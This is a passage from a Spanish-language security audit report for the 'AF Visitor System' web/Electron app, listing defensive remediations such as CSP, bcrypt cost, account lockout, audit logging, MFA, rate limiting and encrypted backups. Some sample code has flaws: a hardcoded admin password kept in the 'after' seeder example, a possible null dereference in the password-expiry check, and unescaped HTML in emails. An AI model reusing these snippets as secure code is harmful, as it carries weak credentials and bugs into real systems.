**Usar en todos los componentes**:
```typescript
// client/src/components/ActiveVisits.tsx
const visitorName = sanitizeInput(visit.Visitor?.first_name || '');
const company = sanitizeInput(visit.Visitor?.company || '');
```

#### A-2: Implementar Content Security Policy
**Archivo**: `electron/main.ts`
```typescript
mainWindow = new BrowserWindow({
    webPreferences: {
        preload: path.join(__dirname, 'preload.js'),
        nodeIntegration: false,
        contextIsolation: true,
        sandbox: true,  // ← Agregar
    }
});

// Agregar CSP headers
mainWindow.webContents.session.webRequest.onHeadersReceived((details, callback) => {
    callback({
        responseHeaders: {
            ...details.responseHeaders,
            'Content-Security-Policy': [
                "default-src 'self'",
                "script-src 'self'",
                "style-src 'self' 'unsafe-inline'",  // Tailwind necesita inline
                "img-src 'self' data: blob:",
                "connect-src 'self' http://localhost:3000",
                "font-src 'self'",
                "object-src 'none'",
                "base-uri 'self'",
                "form-action 'self'",
                "frame-ancestors 'none'",
                "upgrade-insecure-requests"
            ].join('; ')
        }
    });
});
```

#### A-3: Aumentar bcrypt rounds a 12
**Archivo**: `server/src/utils/seeder.ts` y todos los lugares donde se hashea
```typescript
// ANTES
const hashedAdmin = await bcrypt.hash('Trebol123*', 8);

// DESPUÉS
const hashedAdmin = await bcrypt.hash('Trebol123*', 12);
```

**Crear constante**:
```typescript
// server/src/config/AppConfig.ts
export default {
    // ...
    bcryptRounds: parseInt(process.env.BCRYPT_ROUNDS || '12', 10)
};
```

#### A-4: Implementar bloqueo de cuenta
**Archivo**: `server/src/models/User.ts`
```typescript
class User extends Model {
    // ...
    declare loginAttempts: CreationOptional<number>;
    declare lockedUntil: CreationOptional<Date | null>;
}

User.init({
    // ...
    loginAttempts: {
        type: DataTypes.INTEGER,
        defaultValue: 0
    },
    lockedUntil: {
        type: DataTypes.DATE,
        allowNull: true
    }
}, { /* ... */ });
```

**Lógica en Login.usecase.ts**:
```typescript
export class LoginUseCase {
    async execute(username: string, password: string) {
        const user = await this.userRepository.findByUsername(username);
        
        if (!user) {
            throw new Error('Credenciales inválidas');
        }
        
        // Verificar si está bloqueado
        if (user.lockedUntil && user.lockedUntil > new Date()) {
            const minutesLeft = Math.ceil((user.lockedUntil.getTime() - Date.now()) / 60000);
            throw new Error(`Cuenta bloqueada. Intente en ${minutesLeft} minutos.`);
        }
        
        // Verificar contraseña
        const isValid = await bcrypt.compare(password, user.password);
        
        if (!isValid) {
            // Incrementar intentos fallidos
            user.loginAttempts += 1;
            
            if (user.loginAttempts >= 5) {
                // Bloquear por 15 minutos
                user.lockedUntil = new Date(Date.now() + 15 * 60 * 1000);
                await user.save();
                
                // Auditar
                await this.auditService.log({
                    action: 'ACCOUNT_LOCKED',
                    userId: user.id,
                    severity: 'high'
                });
                
                throw new Error('Cuenta bloqueada por múltiples intentos fallidos');
            }
            
            await user.save();
            throw new Error('Credenciales inválidas');
        }
        
        // Login exitoso: resetear intentos
        user.loginAttempts = 0;
        user.lockedUntil = null;
        await user.save();
        
        // Generar token
        const token = this.authService.generateToken(user);
        return { token, user };
    }
}
```

#### A-5: Implementar auditoría completa
**Archivo**: `server/src/middleware/audit.middleware.ts`
```typescript
export const auditMiddleware = (action: string, resource: string) => {
    return async (req: Request, res: Response, next: NextFunction) => {
        const startTime = Date.now();
        const originalSend = res.send;
        
        res.send = function(data) {
            const duration = Date.now() - startTime;
            const status = res.statusCode >= 200 && res.statusCode < 300 ? 'success' : 'failure';
            
            // Crear log asíncrono (no bloquear respuesta)
            setImmediate(async () => {
                try {
                    await AuditLog.create({
                        timestamp: new Date(),
                        userId: req.user?.id,
                        username: req.user?.username,
                        role: req.user?.role,
                        action,
                        resource,
                        resourceId: req.params.id || req.body.id,
                        ipAddress: req.ip || req.connection.remoteAddress,
                        userAgent: req.get('user-agent'),
                        method: req.method,
                        path: req.path,
                        status,
                        statusCode: res.statusCode,
                        duration,
                        details: JSON.stringify({
                            query: req.query,
                            params: req.params
                        }),
                        severity: determineSeverity(action, status, res.statusCode)
                    });
                } catch (error) {
                    console.error('Audit log error:', error);
                }
            });
            
            return originalSend.call(this, data);
        };
        
        next();
    };
};

function determineSeverity(action: string, status: string, statusCode: number): string {
    if (statusCode >= 500) return 'critical';
    if (statusCode === 403 || statusCode === 401) return 'high';
    if (action.includes('delete') || action.includes('backup')) return 'high';
    if (status === 'failure') return 'medium';
    return 'low';
}
```

**Aplicar a todas las rutas**:
```typescript
// server/src/routes/visit-clean.routes.ts
router.post('/v1/visits/checkin', 
    verifyToken, 
    denyAuditorOnly,
    auditMiddleware('VISIT_CHECKIN', 'visit'),  // ← Agregar
    validate(checkInSchema), 
    asyncHandler(VisitCleanController.checkIn)
);

router.post('/v1/visits/:id/checkout', 
    verifyToken, 
    denyAuditorOnly,
    auditMiddleware('VISIT_CHECKOUT', 'visit'),  // ← Agregar
    asyncHandler(VisitCleanController.checkOut)
);

// ... aplicar a TODAS las rutas
```

#### A-6: Implementar envío de emails
**Dependencia**: `npm install nodemailer`

**Archivo**: `server/src/infrastructure/services/EmailService.ts`
```typescript
import nodemailer from 'nodemailer';
import config from '../../config/AppConfig';

export class EmailService {
    private transporter;
    
    constructor() {
        this.transporter = nodemailer.createTransport({
            host: config.smtpHost,
            port: config.smtpPort,
            secure: config.smtpSecure,
            auth: {
                user: config.smtpUser,
                pass: config.smtpPassword
            }
        });
    }
    
    async sendPasswordReset(email: string, token: string, username: string) {
        const resetUrl = `${config.appUrl}/reset-password?token=${token}`;
        
        await this.transporter.sendMail({
            from: config.emailFrom,
            to: email,
            subject: 'Recuperación de Contraseña - AF Visitor System',
            html: `
                <h2>Recuperación de Contraseña</h2>
                <p>Hola ${username},</p>
                <p>Recibimos una solicitud para recuperar tu contraseña.</p>
                <p>Haz clic en el siguiente enlace para crear una nueva contraseña:</p>
                <p><a href="${resetUrl}">Recuperar Contraseña</a></p>
                <p>Este enlace expira en 15 minutos.</p>
                <p><strong>Si no solicitaste esto, ignora este email.</strong></p>
                <hr>
                <p><small>AF Visitor System - Control de Acceso</small></p>
            `
        });
    }
    
    async sendPasswordChanged(email: string, username: string) {
        await this.transporter.sendMail({
            from: config.emailFrom,
            to: email,
            subject: 'Contraseña Cambiada - AF Visitor System',
            html: `
                <h2>Contraseña Cambiada</h2>
                <p>Hola ${username},</p>
                <p>Tu contraseña ha sido cambiada exitosamente.</p>
                <p>Si no realizaste este cambio, contacta al administrador inmediatamente.</p>
            `
        });
    }
}
```

**Actualizar**: `.env.example`
```env
# Email Configuration
SMTP_HOST=smtp.gmail.com
SMTP_PORT=587
SMTP_SECURE=false
SMTP_USER=your-email@gmail.com
SMTP_PASSWORD=your-app-password
EMAIL_FROM="AF Visitor System <noreply@visitor-system.com>"
APP_URL=http://localhost:5173
```

#### A-7: Validar tipos de archivo en upload
**Archivo**: `client/src/components/PhotoCapture.tsx`
```typescript
const validateImage = (base64: string): boolean => {
    // Verificar que sea una imagen válida
    const validPrefixes = [
        'data:image/jpeg;base64,',
        'data:image/jpg;base64,',
        'data:image/png;base64,'
    ];
    
    if (!validPrefixes.some(prefix => base64.startsWith(prefix))) {
        toast.error('Solo se permiten imágenes JPEG o PNG');
        return false;
    }
    
    // Verificar tamaño (max 5MB)
    const sizeInBytes = (base64.length * 3) / 4;
    const maxSize = 5 * 1024 * 1024; // 5MB
    
    if (sizeInBytes > maxSize) {
        toast.error('La imagen es demasiado grande (máximo 5MB)');
        return false;
    }
    
    return true;
};

const handleCapture = () => {
    const imageSrc = webcamRef.current?.getScreenshot();
    if (imageSrc && validateImage(imageSrc)) {
        onCapture(imageSrc);
    }
};
```

---

### 🟡 PRIORIDAD MEDIA (Implementar en 2-4 semanas)


#### M-1: Refactorizar middlewares según Clean Architecture
**Crear abstracciones** según la sección 3.3 de este informe.

#### M-2: Implementar rotación de contraseñas
**Archivo**: `server/src/models/User.ts`
```typescript
declare passwordExpiresAt: CreationOptional<Date | null>;
```

**Middleware**:
```typescript
export const checkPasswordExpiration = (req: Request, res: Response, next: NextFunction) => {
    const user = req.user as any;
    
    if (user.passwordExpiresAt && user.passwordExpiresAt < new Date()) {
        return res.status(403).json(ResponseBuilder.error(
            'PASSWORD_EXPIRED',
            'Su contraseña ha expirado. Debe cambiarla.',
            { requirePasswordChange: true }
        ));
    }
    
    // Advertir si expira pronto (7 días)
    const daysUntilExpiry = Math.ceil(
        (user.passwordExpiresAt.getTime() - Date.now()) / (1000 * 60 * 60 * 24)
    );
    
    if (daysUntilExpiry <= 7) {
        res.setHeader('X-Password-Expires-In-Days', daysUntilExpiry.toString());
    }
    
    next();
};
```

#### M-3: Implementar MFA (TOTP)
**Dependencia**: `npm install speakeasy qrcode`

**Modelo**:
```typescript
class User extends Model {
    declare mfaEnabled: CreationOptional<boolean>;
    declare mfaSecret: CreationOptional<string | null>;
}
```

**Endpoints**:
```typescript
// POST /api/v1/auth/mfa/setup
export const setupMFA = async (req: Request, res: Response) => {
    const user = req.user;
    const secret = speakeasy.generateSecret({
        name: `AF Visitor System (${user.username})`
    });
    
    // Guardar secret temporalmente
    user.mfaSecret = secret.base32;
    await user.save();
    
    // Generar QR code
    const qrCode = await QRCode.toDataURL(secret.otpauth_url);
    
    res.json({
        secret: secret.base32,
        qrCode
    });
};

// POST /api/v1/auth/mfa/verify
export const verifyMFA = async (req: Request, res: Response) => {
    const { token } = req.body;
    const user = req.user;
    
    const verified = speakeasy.totp.verify({
        secret: user.mfaSecret,
        encoding: 'base32',
        token,
        window: 2
    });
    
    if (verified) {
        user.mfaEnabled = true;
        await user.save();
        res.json({ success: true });
    } else {
        res.status(400).json({ error: 'Código inválido' });
    }
};

// Modificar login para requerir MFA
export class LoginUseCase {
    async execute(username: string, password: string, mfaToken?: string) {
        // ... validar usuario y contraseña
        
        if (user.mfaEnabled) {
            if (!mfaToken) {
                return {
                    requireMFA: true,
                    tempToken: generateTempToken(user.id)
                };
            }
            
            const verified = speakeasy.totp.verify({
                secret: user.mfaSecret,
                encoding: 'base32',
                token: mfaToken,
                window: 2
            });
            
            if (!verified) {
                throw new Error('Código MFA inválido');
            }
        }
        
        // Generar token final
        return { token: generateToken(user) };
    }
}
```

#### M-4: Implementar gestión de usuarios en UI
**Crear**: `client/src/components/admin/UserManagement.tsx`

```typescript
export const UserManagement = () => {
    const [users, setUsers] = useState<User[]>([]);
    const [showCreateModal, setShowCreateModal] = useState(false);
    
    const fetchUsers = async () => {
        const response = await axios.get('/api/v1/admin/users');
        setUsers(response.data);
    };
    
    const handleCreateUser = async (userData: CreateUserDto) => {
        await axios.post('/api/v1/admin/users', userData);
        toast.success('Usuario creado');
        fetchUsers();
    };
    
    const handleResetPassword = async (userId: number) => {
        await axios.post(`/api/v1/admin/users/${userId}/reset-password`);
        toast.success('Email de recuperación enviado');
    };
    
    const handleToggleActive = async (userId: number, active: boolean) => {
        await axios.patch(`/api/v1/admin/users/${userId}`, { active });
        toast.success(active ? 'Usuario activado' : 'Usuario desactivado');
        fetchUsers();
    };
    
    return (
        <div className="panel-tech p-6">
            <div className="flex justify-between mb-4">
                <h2>Gestión de Usuarios</h2>
                <button onClick={() => setShowCreateModal(true)}>
                    Crear Usuario
                </button>
            </div>
            
            <table>
                <thead>
                    <tr>
                        <th>Usuario</th>
                        <th>Rol</th>
                        <th>Estado</th>
                        <th>Último Login</th>
                        <th>Acciones</th>
                    </tr>
                </thead>
                <tbody>
                    {users.map(user => (
                        <tr key={user.id}>
                            <td>{user.username}</td>
                            <td>{user.role}</td>
                            <td>{user.active ? 'Activo' : 'Inactivo'}</td>
                            <td>{user.lastLoginAt}</td>
                            <td>
                                <button onClick={() => handleResetPassword(user.id)}>
                                    Reset Password
                                </button>
                                <button onClick={() => handleToggleActive(user.id, !user.active)}>
                                    {user.active ? 'Desactivar' : 'Activar'}
                                </button>
                            </td>
                        </tr>
                    ))}
                </tbody>
            </table>
            
            <CreateUserModal 
                show={showCreateModal}
                onClose={() => setShowCreateModal(false)}
                onCreate={handleCreateUser}
            />
        </div>
    );
};
```

#### M-5: Implementar rate limiting específico por endpoint
```typescript
// server/src/middleware/rateLimiter.ts
export const strictRateLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutos
    max: 5, // 5 intentos
    message: 'Demasiados intentos, intente más tarde'
});

export const authRateLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 10,
    skipSuccessfulRequests: true  // Solo contar fallos
});

// Aplicar
router.post('/v1/auth/login', authRateLimiter, ...);
router.post('/v1/auth/forgot-password', strictRateLimiter, ...);
router.post('/v1/auth/reset-password', strictRateLimiter, ...);
```

#### M-6: Implementar retención de datos (GDPR)
**Archivo**: `server/src/scripts/data-retention.ts`
```typescript
import cron from 'node-cron';

// Ejecutar diariamente a las 2 AM
cron.schedule('0 2 * * *', async () => {
    const retentionDays = parseInt(process.env.DATA_RETENTION_DAYS || '60', 10);
    const cutoffDate = new Date();
    cutoffDate.setDate(cutoffDate.getDate() - retentionDays);
    
    // Eliminar visitas antiguas completadas
    const deleted = await Visit.destroy({
        where: {
            status: 'completed',
            check_out_time: {
                [Op.lt]: cutoffDate
            }
        }
    });
    
    console.log(`Data retention: ${deleted} old visits deleted`);
    
    // Auditar
    await AuditLog.create({
        action: 'DATA_RETENTION_CLEANUP',
        details: JSON.stringify({ deleted, cutoffDate }),
        severity: 'medium'
    });
});
```

#### M-7: Implementar backup automático encriptado
**Archivo**: `server/src/scripts/auto-backup.ts`
```typescript
import cron from 'node-cron';
import crypto from 'crypto';
import fs from 'fs';
import path from 'path';

// Ejecutar backup diario a las 3 AM
cron.schedule('0 3 * * *', async () => {
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
    const dbPath = path.join(config.dbPath, 'visits.sqlite');
    const backupPath = path.join(config.backupPath, `backup-${timestamp}.sqlite.enc`);
    
    // Leer DB
    const dbData = fs.readFileSync(dbPath);
    
    // Encriptar con AES-256-GCM
    const iv = crypto.randomBytes(16);
    const key = Buffer.from(config.backupPassword, 'hex');
    const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
    
    let encrypted = cipher.update(dbData);
    encrypted = Buffer.concat([encrypted, cipher.final()]);
    const authTag = cipher.getAuthTag();
    
    // Guardar: iv + authTag + encrypted
    const finalData = Buffer.concat([iv, authTag, encrypted]);
    fs.writeFileSync(backupPath, finalData);
    
    console.log(`Backup created: ${backupPath}`);
    
    // Limpiar backups antiguos (mantener últimos 30 días)
    cleanOldBackups(30);
});

function cleanOldBackups(daysToKeep: number) {
    const backupDir = config.backupPath;
    const files = fs.readdirSync(backupDir);
    const cutoffDate = new Date();
    cutoffDate.setDate(cutoffDate.getDate() - daysToKeep);
    
    files.forEach(file => {
        const filePath = path.join(backupDir, file);
        const stats = fs.statSync(filePath);
        
        if (stats.mtime < cutoffDate) {
            fs.unlinkSync(filePath);
            console.log(`Old backup deleted: ${file}`);
        }
    });
}
```

---

## 5. CHECKLIST DE VERIFICACIÓN

### Antes de Producción

- [ ] **C-1**: Claves removidas de código fuente
- [ ] **C-2**: Todas las claves rotadas
- [ ] **C-3**: JWT en memoria (no localStorage)
- [ ] **C-4**: Política de contraseñas implementada
- [ ] **C-5**: Cambio obligatorio de contraseña en primer login
- [ ] **A-1**: Sanitización XSS implementada
- [ ] **A-2**: CSP configurado
- [ ] **A-3**: Bcrypt rounds aumentado a 12
- [ ] **A-4**: Bloqueo de cuenta implementado
- [ ] **A-5**: Auditoría completa implementada
- [ ] **A-6**: Envío de emails configurado
- [ ] **A-7**: Validación de archivos implementada
- [ ] **M-1**: Clean Architecture refactorizada
- [ ] **M-2**: Rotación de contraseñas implementada
- [ ] **M-3**: MFA implementado (opcional pero recomendado)
- [ ] **M-4**: UI de gestión de usuarios
- [ ] **M-5**: Rate limiting específico
- [ ] **M-6**: Retención de datos GDPR
- [ ] **M-7**: Backup automático

### Pruebas de Seguridad

- [ ] Penetration testing (OWASP Top 10)
- [ ] Análisis de dependencias (npm audit)
- [ ] Escaneo de secretos en Git (git-secrets, truffleHog)
- [ ] Revisión de código de seguridad
- [ ] Pruebas de carga y DoS
- [ ] Validación de encriptación
- [ ] Pruebas de recuperación de backup

### Documentación

- [ ] Política de seguridad documentada
- [ ] Procedimientos de respuesta a incidentes
- [ ] Manual de usuario con mejores prácticas
- [ ] Documentación de arquitectura actualizada
- [ ] Plan de recuperación ante desastres

---

## 6. CONCLUSIONES Y RECOMENDACIONES FINALES

### Fortalezas del Sistema

1. ✅ **Arquitectura sólida**: Clean Architecture bien implementada
2. ✅ **Encriptación robusta**: AES-256-GCM para datos sensibles
3. ✅ **Base de datos encriptada**: SQLCipher protege datos en reposo
4. ✅ **RBAC funcional**: Separación clara de roles
5. ✅ **Validación de datos**: Zod implementado correctamente

### Debilidades Críticas

1. ❌ **Gestión de secretos**: Claves hardcodeadas en código
2. ❌ **Almacenamiento de tokens**: JWT en localStorage vulnerable a XSS
3. ❌ **Contraseñas débiles**: Sin política de complejidad
4. ❌ **Auditoría incompleta**: Faltan eventos críticos
5. ❌ **Sin gestión de usuarios**: No hay UI para administrar usuarios

### Riesgo General

**ANTES de implementar mejoras**: 🔴 **ALTO RIESGO**
- Sistema vulnerable a compromiso de credenciales
- Datos sensibles en riesgo por claves expuestas
- No cumple completamente con ISO 27001

**DESPUÉS de implementar mejoras**: 🟢 **RIESGO ACEPTABLE**
- Sistema robusto para entorno empresarial
- Cumplimiento con ISO 27001
- Protección adecuada de datos personales

### Tiempo Estimado de Implementación

- **Crítico (C-1 a C-5)**: 2-3 días de desarrollo
- **Alto (A-1 a A-7)**: 1 semana de desarrollo
- **Medio (M-1 a M-7)**: 2-4 semanas de desarrollo
- **Total**: 4-6 semanas para implementación completa

### Recomendación Final

Este sistema tiene una **base arquitectónica excelente** y con las mejoras propuestas puede alcanzar un **nivel de seguridad empresarial**. Las vulnerabilidades identificadas son **comunes en desarrollos académicos** y todas tienen soluciones bien documentadas.

**Prioridad absoluta**: Implementar los 5 cambios críticos antes de cualquier despliegue en producción o presentación del proyecto de grado.

---

## ANEXOS

### A. Referencias y Estándares

- ISO/IEC 27001:2022 - Information Security Management
- OWASP Top 10 2021
- NIST Cybersecurity Framework
- GDPR (Reglamento General de Protección de Datos)
- CWE Top 25 Most Dangerous Software Weaknesses

### B. Herramientas Recomendadas

**Análisis de Seguridad**:
- `npm audit` - Vulnerabilidades en dependencias
- `snyk` - Análisis continuo de seguridad
- `git-secrets` - Detectar secretos en Git
- `truffleHog` - Escanear historial de Git

**Testing de Seguridad**:
- OWASP ZAP - Penetration testing
- Burp Suite - Análisis de tráfico HTTP
- SQLMap - Testing de SQL injection
- XSStrike - Testing de XSS

**Monitoreo**:
- Sentry - Error tracking
- LogRocket - Session replay
- Datadog - APM y logs

### C. Contacto para Consultas

Para consultas sobre este informe o implementación de las recomendaciones, contactar al equipo de seguridad.

---

**Fin del Informe de Auditoría**

*Documento generado el: Marzo 2026*  
*Versión: 1.0*  
*Confidencial - Solo para uso interno del proyecto AF Visitor System*
